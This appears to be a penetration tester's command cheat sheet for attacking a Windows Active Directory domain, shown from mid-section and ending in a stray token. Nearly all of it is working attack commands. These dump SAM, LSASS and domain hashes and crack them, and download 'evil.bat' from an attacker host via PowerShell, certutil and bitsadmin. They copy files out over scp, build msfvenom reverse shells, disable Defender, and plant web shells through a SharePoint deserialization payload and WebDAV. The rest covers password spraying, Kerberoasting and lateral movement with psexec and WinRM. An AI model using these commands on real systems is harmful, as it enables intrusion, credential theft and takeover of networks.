pypykatz registry /opt/kinetic/creds/system --sam /opt/kinetic/creds/sam  
*Task Manager*  
Details >> Right click lsass.exe >> Create dump file  
*cme*  
crackmapexec smb demo -u eve -p eve --local-auth --sam  
*crack ntlm*  
john --format=nt  pass-eve.txt -w=/opt/kinetic/creds/pass/lst  
*secrets dump*  
python3 secretsdump.py kinetic/kram@polar  
*Metasploit*  
use post/windows/gather/smart_hashdump  
## Moving files  
powershell Invoke-WebRequest -uri [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) -outfile C:\ProgramData\evil.bat  
powershell wget [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) -OutFile C:\ProgramData\evil.bat  
powershell iwr -uri [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) -outfile C:\ProgramData\evil.bat  
powershell Invoke-RestMethod -Uri [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) -OutFile C:\ProgramData\evil.bat  
powershell irm -Uri [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) -OutFile C:\ProgramData\evil.bat  
powershell Start-BitsTransfer -Source [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) -Destination C:\ProgramData\evil.bat  
python3 smbserver.py -username kali -password hunter2 -smb2support kali /tmp  
net use x: [\\](file:///\\xxx\kali)xxx\kali /user:kali hunter2  
*SCP*  
scp C:\ProgramData\juice.txt kali@xxx:/tmp/juice.txt  
scp kram@polar:C:/ProgramData/juice.txt /tmp/juice2.txt  
scp winPEAS.exe kram@polar:C:\\ProgramData\\winp.exe  
*bitsadmin*  
bitsadmin /transfer /download [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) C:\ProgramData\evil.bat  
*certutil*  
certutil -urlcache -split -f [http://xxx/kinetic/evil.bat](http://xxx/kinetic/evil.bat) C:\ProgramData\evil.bat  
certutil -encode evil.bat evil.b64  
certutil -decode evi.b64 evi.bat  
## PrivEsc  
systeminfo.exe > out.txt  
scp C:\Users\kram\out.txt kali@xxx:/tmp/a.txt  
python3 wes.py /tmp/a.txt -s critical -c  
python3 wes.py /tmp/a.txt -e -c  
python3 wes.py /tmp/out.txt -s critical -c  
msfvenom -p windows/x64/shell/reverse_tcp LPORT=4444 LHOST=xxx -f msi > sploit.msi  
## TokenAcctFilter  
python3 psexec.py eve:eve@demo whoami  
python3 psexec.py administrator:toor@demo whoami  
python3 psexec.py zero/freya@femmefatale whoami  
## Manual Situational Awareness  
whoami /all  
net user kram /domain  
net localgroup administrators  
net share  
net view [\\](file:///\\agentspecial)agentspecial  
wmic useraccount get name,sid  
query session  
## AV  
Get-MpComputerStatus  
Set-MpPreference -DisableRealtimeMonitoring $true  
## Sharpoint  
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell wget -OutFile C:\inetpub\wwwroot\wss\VirtualDirectories\80\_vti_pvt\cmd.aspx [http://xxx/kinetic/cmdasp.aspx](http://xxx/kinetic/cmdasp.aspx)"  
sp2.exe [http://10.65.1.34/sites/operations/](http://10.65.1.34/sites/operations/) cyn password kinetic [\\](file:///\\10.65.3.90\share\SP_soap_RCE_PoC.RCE_Resource.resources)10.65.3.90\share\SP_soap_RCE_PoC.RCE_Resource.resources  
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell wget -OutFile C:\inetpub\wwwroot\wss\VirtualDirectories\80\_vti_pvt\cmd.aspx [http://xxx/kinetic/cmdasp.aspx](http://xxx/kinetic/cmdasp.aspx)"  
## WebDAV  
davtest -auth kinetic\\cyn:password -url [http://corpo/dav](http://corpo/dav)  
davtest -auth kinetic\\cyn:password -url [http://corpo/dav](http://corpo/dav)  -uploadfile cmdasp.aspx -uploadloc cmdasp.aspx  
davtest -auth kinetic\\cyn:password -url [http://corpo/dav](http://corpo/dav)  -uploadfile corpo.exe -uploadloc corpo.exe  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -f exe > corpo.exe  
use exploit/multi/handler  
## Password sprawy  
polenum glorp:password@10.65.1.20  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D glorp -W | grep -m 1 -B 10 pwdHistoryLength  
hydra -t 8 -L ./uplink1.txt -P /usr/share/john/password.lst uplink ssh  
crackmapexec smb uplink -u ./uplink2.txt -p /usr/share/john/password.lst  
spray smb uplink ./uplink1.txt /usr/share/john/password.lst 20 5  
## ASREP and Kerberoasting  
python3 GetNPUsers.py kinetic.corp/dennis -dc-ip 10.65.1.20 -no-pass -format john  
python3 GetNPUsers.py kinetic.corp/cyn -dc-ip 10.65.1.20 -no-pass -format john  
john asrep-cyn.txt --wordlist=/usr/share/wordlists/rockyou.txt  
john spn.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt  
## Adalanche  
adalanche.exe collect activedirectory --tlsmode noTLS --port 389  
adalanche analyze  
./adalanche collect activedirectory --domain kinetic --username glorp@kinetic --password pAsSw0rd --server 10.65.1.20 --tlsmode NoTLS --port 389  
./adalanche collect activedirectory --adexplorerfile=kinetic.dat  
## Grouper  
Group3r.exe -s  
## Winrm  
winrs -r:demo -u:eve "hostname && whoami"  
Enter-PSSession -ComputerName demo -Credential eve  
Invoke-Command -ComputerName demo -ScriptBlock {hostname; whoami} -Credential eve  
evil-winrm -i demo -u eve -p eve  
crackmapexec winrm demo -u eve -p eve  
crackmapexec winrm demo -u eve -p eve -x 'whoami && hostname'  
## SMB  
PsExec.exe [\\](file:///\\demo)demo -u eve cmd  
PsExec.exe [\\](file:///\\demo)demo -u eve -s cmd  
net use W: [\\](file:///\\demo\share)demo\share /user:eve eve  
crackmapexec smb demo -u eve -p eve  
smbclient -U eve [\\\\](file:///\\\\demo\\C$)demo\\C$  
python3 smbclient.py eve@demo  
python3 smbexec.py eve@demo  
python3 psexec.py eve@demo  
## WMI  
wmic computersystem get name  
Get-WmiObject -Class Win32_ComputerSystem -Property Name -ComputerName demo -Credential eve  
## PowerView  
Get-NetDomain  
Get-NetGroup | select samaccountname, admincount, description  
Get-NetDomainTrust  
Get-NetUser -SPN  
Get-NetUser -PreauthNotRequired  
Get-NetUser | select samaccountname  
Get-NetUser -Name case  
Get-NetGroup -UserName "case"  
Get-DomainGPO | select displayName  
Get-DomainGPO -Identity "Hyper Drive Station"  
## dsquery  
dsquery.exe computer  
dsquery.exe user  
dsquery.exe group  
dsquery.exe group -name "*admin*"  
dsquery * "CN=System,DC=KINETIC,DC=CORP" -filter "(objectClass=trustedDomain)" -attr trustPartner flatName  
## ldapsearch  
ldapsearch -H ldap://10.65.1.20 -x -s base  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W "(objectclass=computer)"  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W "(objectclass=user)"  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W "(objectclass=group)" cn member  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W  
ldapsearch -H ldap://10.65.1.20 -x -b 'DC=kinetic,DC=corp' -D pAsW0rd -W > kinetic.ldap  
cat kinetic.ldap |grep "objectClass:"

RXFALL20